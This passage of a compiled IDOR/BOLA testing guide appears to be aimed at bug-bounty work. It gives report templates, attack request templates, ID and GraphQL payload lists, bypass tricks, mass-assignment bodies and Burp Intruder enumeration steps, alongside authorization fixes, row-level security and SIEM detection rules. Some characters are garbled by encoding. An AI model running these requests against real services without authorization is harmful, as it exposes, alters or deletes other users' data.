**Attack:** Substitute `subredditName` parameter in GraphQL request to `gql.reddit.com` to retrieve moderation logs from any subreddit.

### Stripe/Taxjar #1581240 — Invitation Token ATO

**Attack:** DELETE endpoint response leaked invitation tokens. Captured tokens used to accept invitations. Result: mass account takeover across Taxjar customer base.

**Key lesson:** Even read-only IDORs enable business logic abuse. Error responses may leak data even when the auth check rejects the main request.

---

## 18. Report Writing Methodology

### Report Structure Template

```
Title: [IDOR] Unauthorized {read/modify/delete} of {resource} via {endpoint}
Example: [IDOR] Any authenticated user can read and delete any other user's invoices via GET/DELETE /api/invoices/{id}

## Summary
One paragraph. Lead with business impact.
State: what data is exposed, how many users are affected, what an attacker can do.

Example: "An authenticated attacker can read the full invoice (amount, customer name, 
email, billing address, line items) of any user by incrementing the sequential 
invoice_id parameter on /api/invoices/{id}. With approximately 50,000 invoices 
(IDs 1–50000), a full data dump can be completed in under 1 hour. The same 
endpoint also accepts DELETE, allowing irreversible destruction of financial records."

## Severity
CVSS 3.1 score with vector string.
Example: High — 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

## Steps to Reproduce

### Setup
1. Create two test accounts (attacker@test.com and victim@test.com)
2. As victim, create an invoice. Note the invoice ID: INV-12345
3. Record attacker's Bearer token from login response

### Exploitation
4. As attacker, send this request:
   curl -X GET 'https://api.target.com/api/invoices/12345' \
     -H 'Authorization: Bearer ATTACKER_TOKEN'
5. Response contains victim's invoice data including:
   - customerName: [victim's name]
   - customerEmail: [victim's email]
   - amount: [invoice amount]
   - lineItems: [itemized purchases]

### Impact Verification
6. Repeat with DELETE method:
   curl -X DELETE 'https://api.target.com/api/invoices/12345' \
     -H 'Authorization: Bearer ATTACKER_TOKEN'
7. Confirm deletion by trying GET — returns 404.

## Impact
- Data Exposure: customerName, customerEmail, billingAddress, amount, lineItems
- Data Modification: N/A (read-only fields)
- Data Destruction: Invoices can be permanently deleted
- Scale: Estimated 50,000 invoices across all users (IDs observed: 1–50000)
- Regulatory: GDPR Article 83, PCI DSS Req 7.2 implications

## Remediation
Scope the query to the authenticated user:
  invoice = Invoice.objects.get(id=invoice_id, tenant_id=request.user.tenant_id)
  if invoice.owner_id != request.user.id:
      raise Http404  # Return 404, not 403

## References
- OWASP API1:2023 — Broken Object Level Authorization
- CWE-639 — Authorization Bypass Through User-Controlled Key
- CVSS 3.1 Calculator: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
```

### CVSS Scoring Quick Reference

| Scenario | Vector | Score |
|----------|--------|-------|
| Read-only, non-sensitive data | AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N | 4.3 Medium |
| Read PII or financial data | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | 6.5 Medium |
| Read + modify data | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N | 8.1 High |
| Read + modify + delete | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H | 8.8 High |
| Unauthenticated access | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N | 9.1 Critical |
| Cross-tenant with PII | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N | 9.6 Critical |

### Bounty Multipliers

| Factor | Multiplier |
|--------|-----------|
| Cross-tenant access vs same-tenant | 2–5x |
| Write/Delete capability vs read-only | 1.5–3x |
| PII/Financial data vs generic data | 2–4x |
| Enumerable IDs vs random UUIDs | 1.5–2x |
| Chained with another vulnerability | 2–5x |
| Affects admin/internal endpoints | 3–10x |
| Clean, reproducible report | 1.2–1.5x |

**Programs with highest average IDOR bounties:** Reddit ($3,500 avg), New Relic ($1,250 avg), HackerOne ($12,500+ for critical findings), GitLab ($20,000 for critical), Shopify ($5,000)

### Common Report Rejection Reasons

1. **Not demonstrating real impact:** Saying "I changed the ID and got a 200" without showing the response contains another user's actual data
2. **Self-referencing the same account:** Only tested with one account; must demonstrate cross-account access
3. **Public information only:** Accessing data already publicly visible
4. **Out of scope:** Endpoint not listed in the program's scope
5. **Duplicate:** Check disclosed reports for the same program first
6. **Insufficient reproduction steps:** Triage cannot reproduce in 5 minutes
7. **UUID without leak source:** Reporting a UUID IDOR without demonstrating how an attacker obtains the target UUID

### Impact Demonstration Rules

**What to show:**
- Two controlled test accounts demonstrating cross-account access
- Specific field names visible in the response (email, phone, address, credit card last4)
- Response body snippets with synthetic/test data
- Estimated affected user count from observable ID ranges
- curl commands that are copy-pasteable for reproduction

**What NOT to do:**
- Never access real users' private documents, credentials, or payment information
- Never use real personal data beyond your own controlled test accounts
- Never include real user data in the report

---

## 19. Defense Patterns (For Fix Validation and Secure Code Review)

### Framework-Specific Authorization Fixes

**Django REST Framework (Python):**
```python
class IsObjectOwner(BasePermission):
    def has_object_permission(self, request, view, obj):
        return obj.owner == request.user

class DocumentViewSet(viewsets.ModelViewSet):
    permission_classes = [IsAuthenticated, IsObjectOwner]
    def get_queryset(self):
        return Document.objects.filter(
            owner=self.request.user,
            tenant_id=self.request.user.tenant_id)
```

**Rails + Pundit:**
```ruby
# Controller: always use policy_scope + authorize
@document = policy_scope(Document).find(params[:id])
authorize @document
# Policy: class Scope; def resolve; scope.where(tenant_id: user.tenant_id); end; end
```

**Laravel — Global Scopes + Route Model Binding:**
```php
static::addGlobalScope('tenant', fn($q) =>
    auth()->check() ? $q->where('tenant_id', auth()->user()->tenant_id) : $q);
// Routes: ->scoped(['document' => 'uuid'])->scopeBindings();
```

**Spring Boot — @PreAuthorize:**
```java
@PreAuthorize("@authz.canAccess(authentication, #id, 'document', 'read')")
public Document getDocument(Long id) { /* implementation */ }
```

**FastAPI — Dependency Injection:**
```python
async def get_owned_document(document_id: int,
    current_user=Depends(get_current_user), db=Depends(get_db)):
    doc = db.query(Document).filter(
        Document.id == document_id,
        Document.tenant_id == current_user.tenant_id).first()
    if not doc or (doc.owner_id != current_user.id and not current_user.is_admin):
        raise HTTPException(status_code=404)  # 404 not 403!
    return doc
```

**Express.js:**
```javascript
const authorize = (type) => async (req, res, next) => {
  const resource = await models[type].findOne({
    where: { id: req.params.id, tenantId: req.user.tenantId }
  });
  if (!resource || (resource.ownerId !== req.user.id && !req.user.isAdmin))
    return res.status(404).json({ error: 'Not found' });  // 404 not 403!
  req.resource = resource;
  next();
};
```

**Key principle: Return 404, not 403.** A 403 confirms the object exists, enabling enumeration. A 404 reveals nothing.

### Anti-Patterns That Create IDOR

| Anti-Pattern | Root Cause | Example |
|-------------|-----------|---------|
| No check at all | Missing authorization | `Model.findById(id)` |
| Authentication only | Checks login, not ownership | `@login_required` without ownership scope |
| Role check only | No tenant scope | `@admin_required` without org filter |
| Parent check only | Checks parent access, not child | Verify project, not document |
| Read check only | No write-path check | Can read but also write/delete |
| List check only | Filtered list, direct access works | UI hides elements, API serves all |
| Frontend filter only | No server-side check | UI hides button, API still works |

### PostgreSQL Row-Level Security (Defense-in-Depth)

```sql
ALTER TABLE documents ENABLE ROW LEVEL SECURITY;
ALTER TABLE documents FORCE ROW LEVEL SECURITY;  -- REQUIRED: applies even to table owner

CREATE POLICY tenant_isolation ON documents
    FOR ALL
    USING (tenant_id = current_setting('app.current_tenant')::uuid);

-- Per-request: set tenant context in middleware
-- In Python: cursor.execute("SET LOCAL app.current_tenant = %s", [str(request.user.tenant_id)])
-- In Go: db.Exec("SET LOCAL app.current_tenant = $1", tenantID)
```

**Warning:** `FORCE ROW LEVEL SECURITY` is mandatory. Without it, the table owner (application DB user) bypasses all RLS policies.

### SIEM Detection Rules

**Splunk — ID enumeration detection:**
```spl
index=app_logs event_type=authz_decision
| stats count AS access_count dc(resource.id) AS unique_objects BY principal.user_id
| where unique_objects > 50 AND access_count > 100
| table principal.user_id unique_objects access_count
```

**Splunk — Cross-tenant attempts:**
```spl
index=app_logs event_type=authz_decision decision=DENY reason="cross_tenant"
| stats count BY principal.user_id principal.tenant_id resource.tenant_id
| where count > 5
```

**Sigma universal rule (works with Elasticsearch, Splunk, QRadar):**
```yaml
title: IDOR Enumeration Attempt Detected
status: experimental
logsource:
  category: application
  product: web
detection:
  selection:
    event_type: authz_decision
  timeframe: 5m
  condition: selection | count(resource.id) by principal.user_id > 50
level: high
tags:
  - attack.t1078
  - owasp.api1
```

### Honeytoken Strategy

Plant fake objects that no legitimate user would access. Any access triggers an immediate security alert:

```python
HONEY_OBJECTS = {
    'users': ['user_honey_001'],
    'documents': ['doc_honey_001'],
    'invoices': ['inv_honey_001']
}

def check_honeytoken(resource_type, resource_id, accessor):
    if resource_id in HONEY_OBJECTS.get(resource_type, []):
        security_alert(
            severity='critical',
            title='Honeytoken accessed — potential IDOR exploitation',
            accessor=accessor
        )
        revoke_session(accessor['session_id'])
```

---

## 20. Risk Prioritization Matrix

**Test first** (highest ROI based on prevalence and impact):
1. Write/delete endpoints — 41.7% of all BOLA; most missed in security reviews; highest bounties
2. Sequential-ID read endpoints — 36.9% of BOLA; highest frequency; easiest to exploit
3. GraphQL mutations — 7/20 top HackerOne reports; fastest-growing attack surface

**Test second** (high impact, lower frequency):
4. Cross-tenant boundaries in multi-tenant SaaS — 8.3%; swap tenant/org identifiers
5. Multi-step chains — 4.8%; use info from step 1 findings to escalate; 2–5x bounty multiplier
6. Client-supplied ownership fields — 2.4%; inspect hidden form fields and body params

**Test third** (temporal and edge cases):
7. Post-revocation access — 6.0%; re-test after role changes, deactivation, removal
8. Fix bypass verification — re-test previous IDOR fixes with nested/encoded variants

**Risk Quantification (100K-user SaaS at $100/user ARR):**
- Without auth framework: ALE = ~$960,000/year
- With comprehensive framework + CI testing: ALE = ~$60,000/year
- ROI of authorization framework implementation: ~600%

---

## 21. Tool Arsenal

| Tool | Purpose | Rating |
|------|---------|--------|
| Autorize (Burp extension) | Automated session-swap IDOR testing | 5/5 |
| AuthMatrix (Burp extension) | Multi-role matrix authorization testing | 4/5 |
| Turbo Intruder (Burp extension) | Race condition single-packet attacks | 5/5 |
| H2SpaceX (Python pip) | Standalone HTTP/2 race condition testing | 4/5 |
| InQL (Burp extension) | GraphQL schema extraction and testing | 4/5 |
| Clairvoyance | GraphQL field guessing when introspection disabled | 4/5 |
| graphw00f | GraphQL engine fingerprinting | 3/5 |
| graphql-cop | GraphQL security scanner | 3/5 |
| jsluice | JavaScript bundle URL/endpoint extraction | 4/5 |
| gau | Historical URL discovery (archived endpoints) | 4/5 |
| waymore | Extended URL discovery including JavaScript | 4/5 |
| Nuclei | Custom IDOR template scanning + CI/CD | 4/5 |
| ffuf | Numeric ID enumeration fuzzing | 4/5 |
| jadx | Android APK decompilation | 5/5 |
| MobSF | Mobile static analysis (automated) | 4/5 |
| Frida | Runtime mobile instrumentation / pinning bypass | 5/5 |
| Objection | iOS/Android pinning bypass (Frida wrapper) | 4/5 |
| grpcurl | gRPC service enumeration and testing | 4/5 |
| mitmproxy | Mobile traffic interception | 4/5 |
| Caido | Modern proxy alternative to Burp | 4/5 |
| Auth Analyzer (Burp) | Alternative to Autorize, different UI | 4/5 |
| SpiceDB / OpenFGA | Relationship-based authorization for prevention | N/A |

---

## 22. Payload Quick Reference

### Numeric ID Payloads

```
Sequential:    1, 2, 3, 100, 1001, 1002, 1003
Boundary:      0, -1, 2147483647, 9999999999
Float:         42.0, 4.2e1
Octal:         052
Hex:           0x2A
Negative:      -1, -100
```

### UUID Payloads

```
Null:          00000000-0000-0000-0000-000000000000
Max:           ffffffff-ffff-ffff-ffff-ffffffffffff
No dashes:     550e8400e29b41d4a716446655440000
Uppercase:     550E8400-E29B-41D4-A716-446655440000
Version probe: replace version nibble with 1 (time-based), 4 (random), 5 (SHA-1)
```

### Encoded ID Examples

```python
import base64

# Relay Global Node IDs
base64.b64encode(b"User:1").decode()       # VXNlcjox
base64.b64encode(b"User:43").decode()      # VXNlcjo0Mw==
base64.b64encode(b"Invoice:1").decode()    # SW52b2ljZTox
base64.b64encode(b"AdminSetting:1").decode() # QWRtaW5TZXR0aW5nOjE=

# JSON payload encoding
base64.b64encode(b'{"user_id": 43}').decode()  # eyJ1c2VyX2lkIjogNDN9
```

### GraphQL Payload Templates

```graphql
# Node interface probe
query { node(id: "{{BASE64_TYPE_ID}}") { ... on {{TYPE}} { {{FIELDS}} } } }

# Mutation ID swap
mutation { {{ACTION}}(input: { {{ID_FIELD}}: "{{VICTIM_ID}}" }) { {{RESPONSE}} } }

# Alias enumeration (use only 5-10 items against own test objects)
query {
  a1: {{QUERY}}(id: "{{ID_1}}") { {{FIELD}} }
  a2: {{QUERY}}(id: "{{ID_2}}") { {{FIELD}} }
  a3: {{QUERY}}(id: "{{ID_3}}") { {{FIELD}} }
}
```

### Key Attack Request Templates

**Basic REST IDOR:**
```http
GET /api/{{resource}}/{{VICTIM_ID}} HTTP/1.1
Host: {{TARGET}}
Authorization: Bearer {{ATTACKER_TOKEN}}
```

**Body parameter IDOR:**
```http
PUT /api/settings HTTP/1.1
Host: {{TARGET}}
Authorization: Bearer {{ATTACKER_TOKEN}}
Content-Type: application/json

{"user_id": "{{VICTIM_ID}}", "setting": "value"}
```

**Export IDOR:**
```http
GET /api/reports/export?user_id={{VICTIM_ID}}&format=csv HTTP/1.1
Host: {{TARGET}}
Authorization: Bearer {{ATTACKER_TOKEN}}
```

**Cross-tenant:**
```http
GET /api/organizations/{{VICTIM_TENANT_ID}}/data HTTP/1.1
Host: {{TARGET}}
Authorization: Bearer {{ATTACKER_TENANT_TOKEN}}
```

**GraphQL mutation:**
```http
POST /graphql HTTP/1.1
Host: {{TARGET}}
Authorization: Bearer {{ATTACKER_TOKEN}}
Content-Type: application/json

{"query": "mutation { deleteResource(input: { id: \"{{VICTIM_RESOURCE_ID}}\" }) { success } }"}
```


---

## Rifteo Techniques — idor-hunter

# IDOR / BOLA Detection Skill

IDOR (Insecure Direct Object Reference) â€” also called BOLA (Broken Object Level Authorization) in API contexts â€” occurs when an application exposes a reference to an internal object (ID, filename, key) without verifying the requester is authorized to access it.

This is the #1 finding in bug bounty programs. A systematic approach is essential; random testing misses most cases.

---

## Phase 1 â€” Reconnaissance: Find All Object References

Before testing anything, map every place the application exposes object references. Cast a wide net.

### 1.1 URL Path Parameters
```
GET /api/users/1234/profile
GET /invoices/9981/download
GET /orders/ORD-2024-00042
```

### 1.2 Query String Parameters
```
GET /dashboard?user_id=1234
GET /export?report=88&account=5
GET /messages?thread=229&inbox=user1
```

### 1.3 Request Body (JSON / Form Data)
```json
{ "user_id": 1234, "account": "ACC-99" }
```
```
POST /transfer
to_account=12345&amount=100
```

### 1.4 Headers
- `X-User-ID`, `X-Account`, `X-Tenant-ID`
- Custom headers injected by proxies or internal routing

### 1.5 Cookies
- Session cookies that encode a user or role ID
- Non-session cookies: `account_id=1234`, `org=acme`

### 1.6 GraphQL
```graphql
query { user(id: "1234") { email phone address } }
mutation { deletePost(id: "99") { success } }
```

### 1.7 WebSocket Messages
```json
{ "action": "subscribe", "channel": "user_1234_notifications" }
```

### 1.8 Hidden / Non-Obvious References
- Base64-encoded IDs: decode first (`dXNlcl8xMjM0` â†’ `user_1234`)
- JWT claims: `sub`, `user_id`, `org_id` inside the payload
- Hashed IDs: note the hash type, check if predictable
- File names in upload/download flows: `/uploads/user_1234/avatar.png`

**Output of Phase 1:** a table of all discovered references, their location, and their apparent type (numeric ID, UUID, slug, etc.).

---

## Phase 2 â€” Set Up Test Accounts

IDOR requires at least two distinct principals to confirm unauthorized access.

| Scenario | Accounts needed |
|---|---|
| Horizontal privilege escalation | 2 accounts with the same role (Victim A, Attacker B) |
| Vertical privilege escalation | 1 low-privilege + 1 high-privilege account |
| Unauthenticated access | 1 account + unauthenticated session |
| Multi-tenant | 1 account per tenant |

Capture **separate session tokens** for each account before testing.

---

## Phase 3 â€” Systematic Testing

For each object reference found in Phase 1, run the following tests. Use the **Attacker's session** to access the **Victim's object**.

### 3.1 Horizontal IDOR (Same role, different user)
1. Log in as Victim â†’ capture the object reference (e.g., `user_id=1234`)
2. Log in as Attacker â†’ replace their own ID with Victim's ID
3. Check: does the response return Victim's data? Can Attacker modify/delete it?

### 3.2 Vertical IDOR (Low privilege â†’ High privilege)
1. Identify admin/privileged endpoints (look for `/admin/`, `/manage/`, `/internal/`)
2. Use low-privilege session to call them
3. Also: swap a low-privilege object ID into a high-privilege endpoint

### 3.3 Unauthenticated Access
1. Remove auth headers/cookies entirely
2. Replay the request â€” does the server still respond with data?

### 3.4 State-Change Operations (highest impact)
Always test IDOR on write operations â€” these are critical findings:
- `PUT /users/1234` â€” update another user's profile
- `DELETE /posts/99` â€” delete another user's content
- `POST /payments/1234/refund` â€” trigger financial operations on another account
- `POST /admin/users/1234/promote` â€” privilege escalation

### 3.5 Second-Order IDOR
The reference isn't in the request but is resolved server-side:
- Upload a file â†’ server stores it with your user ID internally
- A download or share link later resolves to someone else's object
- Test: modify the share token or download ID

---

## Phase 4 â€” Bypass Techniques

If a naive ID swap is blocked, try these before giving up:

### 4.1 ID Manipulation
| Technique | Example |
|---|---|
| Integer increment/decrement | `1234` â†’ `1233`, `1235` |
| Negative values | `user_id=-1` |
| Zero | `user_id=0` |
| Array wrapping | `user_id[]=1234` |
| JSON type confusion | `"user_id": "1234"` vs `"user_id": 1234` |
| Large/overflow value | `user_id=999999999` |

### 4.2 Encoding Bypasses
- URL encode: `1234` â†’ `%31%32%33%34`
- Double URL encode
- Base64 encode the ID
- Unicode normalization

### 4.3 HTTP Method Manipulation
Try alternate HTTP methods on the same endpoint:
```
GET    /api/users/1234   â†’ 403
POST   /api/users/1234   â†’ 200?
HEAD   /api/users/1234   â†’ leaks via response headers?
OPTIONS /api/users/1234  â†’ reveals allowed methods
```

### 4.4 Parameter Pollution
```
GET /api/orders?id=YOUR_ID&id=VICTIM_ID
POST body: user_id=YOUR_ID&user_id=VICTIM_ID
```

### 4.5 Path Traversal Hybrid
```
GET /api/users/YOUR_ID/../VICTIM_ID/profile
GET /api/users/YOUR_ID/../../admin/list
```

### 4.6 Version / Endpoint Switching
If `v2` is protected, try `v1`:
```
/api/v2/users/1234  â†’ 403
/api/v1/users/1234  â†’ 200 âœ“
/api/users/1234     â†’ 200 âœ“
```

### 4.7 Content-Type Switching
Server may parse differently:
```
Content-Type: application/json    â†’ { "user_id": 1234 }
Content-Type: application/x-www-form-urlencoded â†’ user_id=1234
Content-Type: text/xml            â†’ <user_id>1234</user_id>
```

---

## Phase 5 â€” Confirm the Finding

A true IDOR requires **evidence** that unauthorized data was accessed or modified. Don't report without confirmation.

**Confirmation checklist:**
- [ ] Response contains data belonging to Victim (name, email, PII, etc.)
- [ ] The request used Attacker's valid session (not Victim's)
- [ ] The behavior is reproducible
- [ ] The object ID was the only thing changed between a passing and failing request

**Avoid false positives:**
- 200 response â‰  IDOR (some apps return 200 with empty/generic data)
- Compare response body between "own object" and "victim object" â€” are they actually different?

---

## Phase 6 â€” Report Structure

When reporting an IDOR finding, include:

```
Title: IDOR on [endpoint] allows [horizontal/vertical] privilege escalation

Severity: [Critical / High / Medium based on data sensitivity and impact]

Affected endpoint: [METHOD] [URL]

Steps to reproduce:
1. Log in as Account A (victim). Note [object reference] = [value].
2. Log in as Account B (attacker).
3. Send: [exact HTTP request with attacker session + victim ID]
4. Observe: [what data was returned / action performed]

Impact:
- [What data is exposed or what action can be performed]
- [Number of affected users / scope]

Evidence:
- Request: [redacted HTTP request]
- Response: [relevant snippet showing victim's data]

Remediation:
- Validate that the authenticated user owns or has permission for every object reference server-side
- Never rely on client-supplied IDs alone; always verify against the session's identity
- Implement object-level authorization checks at the service layer, not just routing
```

---

## Quick-Reference: Priority Testing Order

When time is limited, test in this order (highest-impact first):

1. **Financial / payment endpoints** (transfers, refunds, invoices)
2. **PII endpoints** (profile, address, SSN, documents)
3. **State-change operations** (delete, update, promote)
4. **Admin / privileged endpoints** with low-privilege token
5. **File download / export endpoints**
6. **Read-only data endpoints** (lower priority but still valid)

---

## Reference Files

- `references/id-patterns.md` â€” Common ID formats and how to recognize/enumerate them
- `references/tools.md` â€” Recommended tools (Burp Suite extensions, ffuf, custom scripts)



---

## From hack-skills: IDOR/BOLA Advanced Testing

### IDOR vs BOLA vs BFLA

| Term | Meaning | Attack Goal |
|---|---|---|
| IDOR/BOLA | Access another user's object | Read/modify other users' data |
| BFLA | Broken Function Level Authorization | Low-priv user calls admin functions |

### All Locations Where Object IDs Appear

```
URL path:        GET /api/v1/users/1234/profile
URL query:       GET /orders?order_id=982
Request body:    {"userId": 1234, "action": "view"}
Headers:         X-User-ID: 1234 / X-Account-ID: 9999
Cookies:         user_id=1234; account=org_5678
GraphQL args:    query { user(id: "1234") { ... } }
WebSocket msgs:  {"event":"subscribe","channel_id":9999}
```

### A-B Testing Methodology

```
1. Create UserA and UserB
2. As UserA: perform all actions, capture all requests, note all object IDs
3. Switch to UserB's session token
4. Replay all of UserA's requests with UserB's token
5. UserB reads/modifies UserA's data = BOLA confirmed
```

### ID Type Implications

| ID Pattern | Attack |
|---|---|
| Sequential int `id=1001` | Increment/decrement for other users |
| UUID v1 (clock-based) | Extract timestamp+MAC → predict other UUIDs |
| GUIDs in responses | Collect from your own account, try against others |
| Hashed IDs (md5) | Hash sequential ints → test |
| base64 encoded | Decode → modify → re-encode |

### HTTP Method Escalation

```
GET /api/v1/users/VICTIM_ID    blocked?
→ try POST, PUT, DELETE, PATCH  → different code path, may skip authz
```

### Parameter Pollution & Type Confusion

```
id[]=1234&id[]=VICTIM_ID       → array: app may use first or last
{"userId": 1234, "id": VICTIM} → two fields: which is authz'd?
{"userId": "1234"} vs integer  → type confusion: different code path
{"id": [1234]}                 → array in JSON
```

### Indirect IDOR (Reference Chain)

```
App checks permission on object A but not on object B referenced by A:

GET /api/messages/1234 → checks ownership ✓
GET /api/attachments/5678 → no ownership check on sub-resource?
→ Access attachments directly by ID

GraphQL: query { myProfile { followers { privateEmail } } }
→ Accessing private field of OTHER users via relationship
```

### Mass Assignment → Privilege Escalation

```json
POST /api/register
{"username":"attacker","password":"X","role":"admin","isAdmin":true}

PUT /api/profile
{"name":"Bob","email":"bob@test.com","subscription":"enterprise","credits":99999}
```

Test any field in the model even if not in API docs: `role`, `isAdmin`, `subscription`, `org_id`, `feature_flags`

### BFLA: Finding Admin Endpoints

```
1. JS bundles — admin routes exposed in frontend code
2. Swagger/OpenAPI: look for "admin", "internal", "privileged" tagged operations
3. Enumerate /api/v1/admin/, /api/v1/manage/, /api/v1/internal/
4. Compare regular vs admin API docs
5. Try bulk/export operations: POST /api/users/bulk-delete, GET /api/export/all-data
```


---

## [IDOR Testing (zebbern)] Additional Techniques

# IDOR Vulnerability Testing

## Purpose

Provide systematic methodologies for identifying and exploiting Insecure Direct Object Reference (IDOR) vulnerabilities in web applications. This skill covers both database object references and static file references, detection techniques using parameter manipulation and enumeration, exploitation via Burp Suite, and remediation strategies for securing applications against unauthorized access.

## Inputs / Prerequisites

- **Target Web Application**: URL of application with user-specific resources
- **Multiple User Accounts**: At least two test accounts to verify cross-user access
- **Burp Suite or Proxy Tool**: Intercepting proxy for request manipulation
- **Authorization**: Written permission for security testing
- **Understanding of Application Flow**: Knowledge of how objects are referenced (IDs, filenames)

## Outputs / Deliverables

- **IDOR Vulnerability Report**: Documentation of discovered access control bypasses
- **Proof of Concept**: Evidence of unauthorized data access across user contexts
- **Affected Endpoints**: List of vulnerable API endpoints and parameters
- **Impact Assessment**: Classification of data exposure severity
- **Remediation Recommendations**: Specific fixes for identified vulnerabilities

## Core Workflow

### 1. Understand IDOR Vulnerability Types

#### Direct Reference to Database Objects
Occurs when applications reference database records via user-controllable parameters:
```
# Original URL (authenticated as User A)
example.com/user/profile?id=2023

# Manipulation attempt (accessing User B's data)
example.com/user/profile?id=2022
```

#### Direct Reference to Static Files
Occurs when applications expose file paths or names that can be enumerated:
```
# Original URL (User A's receipt)
example.com/static/receipt/205.pdf

# Manipulation attempt (User B's receipt)
example.com/static/receipt/200.pdf
```

### 2. Reconnaissance and Setup

#### Create Multiple Test Accounts
```
Account 1: "attacker" - Primary testing account
Account 2: "victim" - Account whose data we attempt to access
```

#### Identify Object References
Capture and analyze requests containing:
- Numeric IDs in URLs: `/api/user/123`
- Numeric IDs in parameters: `?id=123&action=view`
- Numeric IDs in request body: `{"userId": 123}`
- File paths: `/download/receipt_123.pdf`
- GUIDs/UUIDs: `/profile/a1b2c3d4-e5f6-...`

#### Map User IDs
```
# Access user ID endpoint (if available)
GET /api/user-id/

# Note ID patterns:
# - Sequential integers (1, 2, 3...)
# - Auto-incremented values
# - Predictable patterns
```

### 3. Detection Techniques

#### URL Parameter Manipulation
```
# Step 1: Capture original authenticated request
GET /api/user/profile?id=1001 HTTP/1.1
Cookie: session=attacker_session

# Step 2: Modify ID to target another user
GET /api/user/profile?id=1000 HTTP/1.1
Cookie: session=attacker_session

# Vulnerable if: Returns victim's data with attacker's session
```

#### Request Body Manipulation
```
# Original POST request
POST /api/address/update HTTP/1.1
Content-Type: application/json
Cookie: session=attacker_session

{"id": 5, "userId": 1001, "address": "123 Attacker St"}

# Modified request targeting victim
{"id": 5, "userId": 1000, "address": "123 Attacker St"}
```

#### HTTP Method Switching
```
# Original GET request may be protected
GET /api/admin/users/1000 â†’ 403 Forbidden

# Try alternative methods
POST /api/admin/users/1000 â†’ 200 OK (Vulnerable!)
PUT /api/admin/users/1000 â†’ 200 OK (Vulnerable!)
```

### 4. Exploitation with Burp Suite

#### Manual Exploitation
```
1. Configure browser proxy through Burp Suite
2. Login as "attacker" user
3. Navigate to profile/data page
4. Enable Intercept in Proxy tab
5. Capture request with user ID
6. Modify ID to victim's ID
7. Forward request
8. Observe response for victim's data
```

#### Automated Enumeration with Intruder
```
1. Send request to Intruder (Ctrl+I)
2. Clear all payload positions
3. Select ID parameter as payload position
4. Configure attack type: Sniper
5. Payload settings:
   - Type: Numbers
   - Range: 1 to 10000
   - Step: 1
6. Start attack
7. Analyze responses for 200 status codes
```

#### Battering Ram Attack for Multiple Positions
```
# When same ID appears in multiple locations
PUT /api/addresses/Â§5Â§/update HTTP/1.1

{"id": Â§5Â§, "userId": 3}

Attack Type: Battering Ram
Payload: Numbers 1-1000
```

### 5. Common IDOR Locations

#### API Endpoints
```
/api/user/{id}
/api/profile/{id}
/api/order/{id}
/api/invoice/{id}
/api/document/{id}
/api/message/{id}
/api/address/{id}/update
/api/address/{id}/delete
```

#### File Downloads
```
/download/invoice_{id}.pdf
/static/receipts/{id}.pdf
/uploads/documents/{filename}
/files/reports/report_{date}_{id}.xlsx
```

#### Query Parameters
```
?userId=123
?orderId=456
?documentId=789
?file=report_123.pdf
?account=user@email.com
```

## Quick Reference

### IDOR Testing Checklist

| Test | Method | Indicator of Vulnerability |
|------|--------|---------------------------|
| Increment/Decrement ID | Change `id=5` to `id=4` | Returns different user's data |
| Use Victim's ID | Replace with known victim ID | Access granted to victim's resources |
| Enumerate Range | Test IDs 1-1000 | Find valid records of other users |
| Negative Values | Test `id=-1` or `id=0` | Unexpected data or errors |
| Large Values | Test `id=99999999` | System information disclosure |
| String IDs | Change format `id=user_123` | Logic bypass |
| GUID Manipulation | Modify UUID portions | Predictable UUID patterns |

### Response Analysis

| Status Code | Interpretation |
|-------------|----------------|
| 200 OK | Potential IDOR - verify data ownership |
| 403 Forbidden | Access control working |
| 404 Not Found | Resource doesn't exist |
| 401 Unauthorized | Authentication required |
| 500 Error | Potential input validation issue |

### Common Vulnerable Parameters

| Parameter Type | Examples |
|----------------|----------|
| User identifiers | `userId`, `uid`, `user_id`, `account` |
| Resource identifiers | `id`, `pid`, `docId`, `fileId` |
| Order/Transaction | `orderId`, `transactionId`, `invoiceId` |
| Message/Communication | `messageId`, `threadId`, `chatId` |
| File references | `filename`, `file`, `document`, `path` |

## Constraints and Limitations

### Operational Boundaries
- Requires at least two valid user accounts for verification
- Some applications use session-bound tokens instead of IDs
- GUID/UUID references harder to enumerate but not impossible
- Rate limiting may restrict enumeration attempts
- Some IDOR requires chained vulnerabilities to exploit

### Detection Challenges
- Horizontal privilege escalation (user-to-user) vs vertical (user-to-admin)
- Blind IDOR where response doesn't confirm access
- Time-based IDOR in asynchronous operations
- IDOR in websocket communications

### Legal Requirements
- Only test applications with explicit authorization
- Document all testing activities and findings
- Do not access, modify, or exfiltrate real user data
- Report findings through proper disclosure channels

## Examples

### Example 1: Basic ID Parameter IDOR
```
# Login as attacker (userId=1001)
# Navigate to profile page

# Original request
GET /api/profile?id=1001 HTTP/1.1
Cookie: session=abc123

# Response: Attacker's profile data

# Modified request (targeting victim userId=1000)
GET /api/profile?id=1000 HTTP/1.1
Cookie: session=abc123

# Vulnerable Response: Victim's profile data returned!
```

### Example 2: IDOR in Address Update Endpoint
```
# Intercept address update request
PUT /api/addresses/5/update HTTP/1.1
Content-Type: application/json
Cookie: session=attacker_session

{
  "id": 5,
  "userId": 1001,
  "street": "123 Main St",
  "city": "Test City"
}

# Modify userId to victim's ID
{
  "id": 5,
  "userId": 1000,  # Changed from 1001
  "street": "Hacked Address",
  "city": "Exploit City"
}

# If 200 OK: Address created under victim's account
```

### Example 3: Static File IDOR
```
# Download own receipt
GET /api/download/5 HTTP/1.1
Cookie: session=attacker_session

# Response: PDF of attacker's receipt (order #5)

# Attempt to access other receipts
GET /api/download/3 HTTP/1.1
Cookie: session=attacker_session

# Vulnerable Response: PDF of victim's receipt (order #3)!
```

### Example 4: Burp Intruder Enumeration
```
# Configure Intruder attack
Target: PUT /api/addresses/Â§1Â§/update
Payload Position: Address ID in URL and body

Attack Configuration:
- Type: Battering Ram
- Payload: Numbers 0-20, Step 1

Body Template:
{
  "id": Â§1Â§,
  "userId": 3
}

# Analyze results:
# - 200 responses indicate successful modification
# - Check victim's account for new addresses
```

### Example 5: Horizontal to Vertical Escalation
```
# Step 1: Enumerate user roles
